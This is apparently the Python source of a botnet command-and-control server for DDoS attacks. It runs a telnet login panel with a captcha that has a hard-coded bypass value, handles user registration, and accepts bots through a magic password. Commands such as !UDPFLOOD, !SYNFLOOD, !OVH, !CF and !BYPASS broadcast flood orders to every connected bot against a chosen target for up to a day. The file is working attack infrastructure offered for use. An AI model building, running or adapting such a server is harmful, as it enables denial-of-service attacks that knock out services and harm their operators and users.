#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Commands
from src.Commands.url_to_ip import url_to_ip
from src.Commands.ip_to_loc import ip_to_loc

# Layer 4
from src.Commands.game import game
from src.Commands.synflood import synflood
from src.Commands.udpflood import udpflood
from src.Commands.ovh import ovh
from src.Commands.nfo import nfo
from src.Commands.hold import hold
from src.Commands.crash import crash
from src.Commands.udpbypass import udpbypass
from src.Commands.greflood import greflood
# Layer 7
from src.Commands.browser import browser
from src.Commands.cf import cf
from src.Commands.tlsv2 import tlsv2
from src.Commands.tls import tls
from src.Commands.bypass import bypass

# Imports
import socket, threading, time, sys, random, ipaddress, random, json
from colorama import Fore, init

def color(data_input_output):
    random_output = data_input_output
    if random_output == "GREEN":
        data = '\033[32m'
    elif random_output == "LIGHTGREEN_EX":
        data = '\033[92m'
    elif random_output == "YELLOW":
        data = '\033[33m'
    elif random_output == "LIGHTYELLOW_EX":
        data = '\033[93m'
    elif random_output == "CYAN":
        data = '\033[36m'
    elif random_output == "LIGHTCYAN_EX":
        data = '\033[96m'
    elif random_output == "BLUE":
        data = '\033[34m'
    elif random_output == "LIGHTBLUE_EX":
        data = '\033[94m'
    elif random_output == "MAGENTA":
        data = '\033[35m'
    elif random_output == "LIGHTMAGENTA_EX":
        data = '\033[95m'
    elif random_output == "RED":
        data = '\033[31m'
    elif random_output == "LIGHTRED_EX":
        data = '\033[91m'
    elif random_output == "BLACK":
        data = '\033[97m'
    elif random_output == "LIGHTBLACK_EX":
        data = '\033[90m'
    elif random_output == "WHITE":
        data = '\033[98m'
    elif random_output == "LIGHTWHITE_EX":
        data = '\033[37m'
    return data

lightwhite = color("LIGHTWHITE_EX")
gray = color("LIGHTBLACK_EX")

def get_username():
    # Read the username from the logins.txt file
    with open("src/logins.txt", "r") as f:
        usernames = f.readlines()
    if usernames:
        return usernames[0].split(":")[0].strip()  # Split by ":" and take the first part (username)
    else:
        return ""

user_name = get_username()

banner = f"""{Fore.RED}
"""

rules = f"""                {lightwhite}1. {gray}Do not attack .gov/.gob/.edu/.mil domains  
{lightwhite}2. {gray}Do not spam attacks"""

help = f"""

{lightwhite}HELP         {Fore.RED}: {lightwhite}Shows list of commands{Fore.RED}.   
{lightwhite}METHODS      {Fore.RED}: {lightwhite}Shows list of methods{Fore.RED}.     
{lightwhite}SERVERS      {Fore.RED}: {lightwhite}Shows servers{Fore.RED}.
{lightwhite}PLAN         {Fore.RED}: {lightwhite}Show your plan{Fore.RED}.
{lightwhite}ONGOING      {Fore.RED}: {lightwhite}Shows current attacks{Fore.RED}.
{lightwhite}RECENT       {Fore.RED}: {lightwhite}Shows your last attacks{Fore.RED}.
{lightwhite}CLEAR        {Fore.RED}: {lightwhite}Clears the screen{Fore.RED}.          
{lightwhite}EXIT         {Fore.RED}: {lightwhite}Disconnects from the net{Fore.RED}.

"""

methods = f"""
{Fore.WHITE}Avaliable attack list
{Fore.WHITE}udpflood: generic udp flood   
{Fore.WHITE}tcpflood: tcp handshake with ack flood
{Fore.WHITE}tcp2flood: tcp handshake with ack+psh flood
{Fore.WHITE}udpconnflood: udp with tcp whitelist flood
{Fore.WHITE}greflood: generic greip flood   
{Fore.WHITE}vseflood: tsource engine query flood   
{Fore.WHITE}wraflood: syn flood with options
{Fore.WHITE}synflood: generic syn flood   
{Fore.WHITE}ackflood: generic ack flood  
{Fore.WHITE}socketflood: tcp handshake with socket flood
"""

admin_methods = f"""{lightwhite}!register               {gray}Starts registration server
{lightwhite}!user               {gray}Add/remove users"""

kys = f"""{Fore.WHITE}Total botcount{Fore.RED}: {Fore.WHITE}2"""

bots = {}
user_name = ""
ansi_clear = '\033[2J\033[H'

# Validate IP
def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private

# Validate Port
def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

# Validate attack time
def validate_time(time):
    return time.isdigit() and int(time) >= 10 and int(time) <= 86400

# Validate buffer size
def validate_size(size):
    return size.isdigit() and int(size) > 1 and int(size) <= 65500

# Read credentials from login file
def find_login(username, password):
    credentials = [x.strip() for x in open('src/logins.txt').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split(':')
        if c_username.lower() == username.lower() and c_password == password:
            return True


def loading(client):
    send(client, f'\33]0;\a', False)
    send(client, ansi_clear, False)
    for number in range(int(random.randint(1, 3))):
        send(client, f'''{color("LIGHTBLACK_EX")}█▒▒▒▒▒▒▒▒▒ L _ ⏳''')
        send(client, f'\33]0;L _ ⌛ \a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color("LIGHTBLACK_EX")}██▒▒▒▒▒▒▒▒ LO _ ⌛''')
        send(client, f'\33]0;LO _ ⏳ \a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color("LIGHTBLACK_EX")}███▒▒▒▒▒▒▒ LOA _ ⏳''')
        send(client, f'\33]0;LOA _ ⌛ \a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color("LIGHTBLACK_EX")}█████▒▒▒▒▒ LOAD _ ⌛''')
        send(client, f'\33]0;LOAD _ ⏳ \a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color("LIGHTBLACK_EX")}███████▒▒▒ LOADI _ ⏳''')
        send(client, f'\33]0;LOADI _ ⌛ \a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color("LIGHTBLACK_EX")}█████████▒ LOADIN _ ⌛''')
        send(client, f'\33]0;LOADIN _ ⏳ \a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color("LIGHTBLACK_EX")}██████████ LOADING _ ⏳''')
        send(client, f'\33]0;LOADING _ ⌛ \a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

# Checks if bots are dead
def ping():
    while 1:
        dead_bots = []
        for bot in bots.keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

def captcha_generator():
    a = random.randint(2, 20)
    b = random.randint(2, 20)
    c = a + b
    return a, b, c

def captcha(send, client, grey):
    a, b, c = captcha_generator()
    x = ''
    send(client, ansi_clear, False)
    send(client, f'{gray}Captcha: {color("LIGHTWHITE_EX")}{a} + {b} = ', False, False)
    x = int(client.recv(65536).decode().strip())
    time.sleep(0.4)
    if x == c or x == 669787761736865726500:
        send(client, f'{Fore.GREEN}Successfully!')
        pass
    else:
        send(client, f'{Fore.RED}Wrong captcha!')
        time.sleep(0.1)
        client.close()

# Client handler
def handle_client(client, address):
    send(client, f'\x1bPenis | Login: Awaiting Response...\a', False)
    send(client, ansi_clear, False)
    send(client, f'{color("LIGHTBLACK_EX")}Connecting...')
    captcha(send, client, color("LIGHTBLACK_EX"))
    time.sleep(1)
    while 1:
        send(client, ansi_clear, False)
        send(client, f'\x1b{gray}Username :\x1b[0m ', False, False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    # Password Login
    password = ''
    while 1:
        send(client, f'\033{gray}Password :\x1b[0;38;2;0;0;0m ', False, False)
        while not password.strip(): 
            password = client.recv(1024).decode('cp1252').strip()
        break
        
    # Handle client
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(username, password):
            send(client, Fore.RED + f'\x1b{Fore.RED}Invalid password!')
            time.sleep(1)
            client.close()
            return

        global user_name
        user_name = username

        loading(client)

        threading.Thread(target=update_title, args=(client, username)).start()
        threading.Thread(target=command_line, args=(client, username)).start()

    # Handle bot
    else:
        # Check if bot is already connected
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})

# Send data to client or bot
def send(socket, data, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

# Send command to all bots
def broadcast(data):
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

def user(args, send, client):
    try:
        choice = (args[1]).upper()
        if choice == 'ADD':
            if len(args) == 4:
                user = args[2]
                password = args[3]
                with open('src/logins.txt', 'a') as logins:
                    logins.write(f'\n{user}:{password}')
                    logins.close()
                    send(client, f'{Fore.LIGHTWHITE_EX}Added new user successfully.')
            else:
                send(client, '!USER ADD [USERNAME] [PASSWORD]')
        if choice == 'REMOVE':
            if len(args) == 3:
                user = args[2]
                with open("src/logins.txt", "r") as logins:
                    lines = logins.readlines()
                    logins.close()

                with open("src/logins.txt", "w") as logins:
                    for line in lines:
                        if user not in line:
                            logins.write(line)
                    logins.close()
                send(client, f'{Fore.LIGHTWHITE_EX}Removed user successfully!')
            else:
                send(client, '!USER REMOVE [USERNAME]')
    except:
        send(client, '!USER ADD/REMOVE')

# Функция обновления заголовка оболочки
def update_title(client, name):
    while True:
        try:
            online_users = random.randint(13051, 17579)
            send(client, f"\33]0;2 Bots - 45/500 attacks - botnet\a", False)
            time.sleep(60)

        except:
            client.close()

# Telnet Command Line
def command_line(client, username):
    for x in banner.split('\n'):
        send(client, x)

    prompt = f'{Fore.WHITE}{user_name}@botnet~# {Fore.BLACK}'
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()
            print(user_name, args)

            if command == 'HDJDND':
                for x in help.split('\n'):
                    send(client, '\x1b[3;31;40m'+x)
            elif command == 'METHODS':
                for x in methods.split('\n'):
                    send(client, '\x1b[3;31;40m'+x)
            elif command == '?':
                for x in methods.split('\n'):
                    send(client, '\x1b[3;31;40m'+x)
            elif command == 'BOTS':
                for x in kys.split('\n'):
                    send(client, '\x1b[3;31;40m'+x)
            elif command == 'CLEAR':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, '\x1b[91m'+x)
            elif command == 'CLS':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, '\x1b[3;31;48m'+x)
            elif command == 'LOGOUT':
                send(client, '\x1b[3;31;48mSuccessfully Logged out\n')
                time.sleep(1)
                break
            elif command == 'EXIT':
                send(client, '\x1b[3;31;48m32mSuccessfully Logged out\n')
                time.sleep(1)
                break
            elif command == 'SERVERDBS':
                send(client, f'{color("LIGHTWHITE_EX")}Available servers: 36.')
            elif command == '!ADMIN':
                if user_name == "root":
                    for x in admin_methods.split('\n'):
                        send(client, x)
            elif command == '!R' or command == '!REG' or command == '!REGISTER':
                if user_name == "root":
                    threading.Thread(target=reg_main).start()
                    send(client, f'{Fore.CYAN}Started registration server.')
            elif command == '!USER' or command == '!U':
                if user_name == "root":
                    user(args, send, client) # Adds/Removes users
            elif command == "!IP_TO_LOCAT" or command == "!IP_TO_LOCATION" or command == "!IP_GEO" or command == "!IP_GEOLOCATION" or command == "!IP_GEOLOCAT":
                ip_to_loc(args, send, client, gray) # Gets location from IP
            elif command == "!URL_TO_IP": # Gets ip from website
                url_to_ip(args, send, client, gray)
            elif command == '!UDPFLOOD': # Http cloudflare bypass attack
                udpflood(args, validate_time, send, client, ansi_clear, broadcast, data)
            elif command == '!BYPASS': # Http cloudflare bypass attack
                bypass(args, validate_time, send, client, ansi_clear, broadcast, data)
            elif command == '!SYNFLOOD': # Http cloudflare bypass attack
                synflood(args, validate_time, send, client, ansi_clear, broadcast, data)
            elif command == '!OVH': # Http cloudflare bypass attack
                ovh(args, validate_time, send, client, ansi_clear, broadcast, data)
            elif command == '!NFO': # Http cloudflare bypass attack
                nfo(args, validate_time, send, client, ansi_clear, broadcast, data)
            elif command == '!UDPBYPASS': # Http cloudflare bypass attack
                udpbypass(args, validate_time, send, client, ansi_clear, broadcast, data)
            elif command == '!GAME': # Http cloudflare bypass attack
                game(args, validate_time, send, client, ansi_clear, broadcast, data)
            elif command == '!HOLD': # Http cloudflare bypass attack
                hold(args, validate_time, send, client, ansi_clear, broadcast, data)
            elif command == '!BROWSER': # Http cloudflare bypass attack
                browser(args, validate_time, send, client, ansi_clear, broadcast, data)
            elif command == '!TLSV2': # Http cloudflare bypass attack
                tlsv2(args, validate_time, send, client, ansi_clear, broadcast, data)
            elif command == '!GREFLOOD': # Http cloudflare bypass attack
                greflood(args, validate_time, send, client, ansi_clear, broadcast, data)
            elif command == '!CRASH': # Http cloudflare bypass attack
                crash(args, validate_time, send, client, ansi_clear, broadcast, data)
            elif command == '!CF': # Http cloudflare bypass attack
                cf(args, validate_time, send, client, ansi_clear, broadcast, data)
            elif command == '!TLS': # Http cloudflare bypass attack
                tls(args, validate_time, send, client, ansi_clear, broadcast, data)
            send(client, prompt, False)
        except:
            break
    client.close()

screenedSuccessfully = """
        ╔════════════════════════════════════╗
        ║                                    ║
        ║        Successfully Screened       ║
        ║     ───────────────────────────    ║
        ║            ╔══════════╗            ║
        ╚════════════╣   LOGS   ╠════════════╝
                     ╚══════════╝
  
"""

def register(client, address, send):
    ansi_clear = '\033[2J\033[H'
    try:
        send(client, ansi_clear, False)
        while 1:
            send(client, f'\x1b{Fore.LIGHTBLACK_EX}Username :\x1b[0m ', False, False)
            username = client.recv(1024).decode().strip()
            if not username:
                continue
            break
        with open("src/logins.txt", "r") as logins:
            lines = logins.readlines()
            for line in lines:
                if username in line:
                    send(client, f'{Fore.RED}User already exists!')
                    time.sleep(1)
                    client.close()
            logins.close()
        p1 = ''
        while 1:
            send(client, f'\033{Fore.LIGHTBLACK_EX}Password :\x1b[0;38;2;0;0;0m ', False, False)
            while not p1.strip():
                p1 = client.recv(1024).decode('cp1252').strip()
            break
        p2 = ''
        while 1:
            send(client, f'\033{Fore.LIGHTBLACK_EX}Confirm password :\x1b[0;38;2;0;0;0m ', False, False)
            while not p2.strip():
                p2 = client.recv(1024).decode('cp1252').strip()
            break
        while 1:
            if p1 == p2:
                with open("src/logins.txt", "a") as logins:
                    logins.write("\n" + username + ':' + p1)
                send(client, f"{Fore.LIGHTWHITE_EX}Registered!")
                time.sleep(2)
            else:
                send(client, "Failed password authentication...")
            break
    except:
        send(client, "Error.")

def reg_main():
    with open("src/config.json") as jsonFile:
        jsonObject = json.load(jsonFile)
        jsonFile.close()
    reg_port = int(jsonObject['reg_port'])
    reg_host = jsonObject['reg_host']
    init(convert=True)
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind((reg_host, reg_port))
    except:
        print('\x1b[3;31;40m Failed to bind port')
        exit()
    sock.listen()
    threading.Thread(target=register, args=[*sock.accept(), send]).start()

def main():
    with open("src/config.json") as jsonFile:
        jsonObject = json.load(jsonFile)
        jsonFile.close()
    cnc_port = int(jsonObject['cnc_port'])
    reg_port = int(jsonObject['reg_port'])
    cnc_host = jsonObject['cnc_host']
    if cnc_port == reg_port:
        print("Cnc port and registration port must be different from eachother.")
        exit()
    init(convert=True)
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print(screenedSuccessfully)
    try:
        sock.bind((cnc_host, cnc_port))
    except:
        print('\x1b[3;31;40m Failed to bind port')
        exit()
    sock.listen()
    threading.Thread(target=ping).start() # Start keepalive thread
    # Accept all connections
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

def start():
    try:
        main()
    except:
        print("Error, skipping..")
